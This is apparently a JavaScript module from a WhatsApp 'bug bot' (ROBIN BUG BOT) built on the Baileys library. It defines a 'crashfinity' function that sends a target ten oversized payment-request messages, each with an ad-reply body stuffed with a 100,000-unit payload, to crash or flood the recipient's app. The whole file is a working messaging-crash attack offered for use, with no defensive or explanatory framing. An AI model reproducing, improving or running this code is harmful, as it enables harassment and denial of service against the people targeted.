
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { getSuperPayload } = require('./SuperPayload');

async function crashfinity(SYxS7, target) {
    try {
        const superSpam = getSuperPayload(100000);
        
        const payload = {
            requestPaymentMessage: {
                currencyCodeIso4217: "USD",
                amount: {
                    value: 999999999,
                    offset: 100,
                    currencyCode: "USD"
                },
                requestFrom: target,
                expiryTimestamp: Date.now() + 999999,
                contextInfo: {
                    externalAdReply: {
                        title: "ROBIN BUG BOT OVERLOAD",
                        body: superSpam,
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        showAdAttribution: true,
                        sourceUrl: "https://github.com/jfufucou/ROBIN-BUG-BOT",
                        thumbnailUrl: "https://files.catbox.moe/tlbp3k.jpg"
                    }
                }
            }
        };

        for (let i = 0; i < 10; i++) {
            await SYxS7.relayMessage(target, payload, {
                participant: { jid: target }
            });
            await new Promise(res => setTimeout(res, 500));
        }
    } catch (error) {
        console.error("crashfinity failed:", error.message);
    }
}

module.exports = { crashfinity };
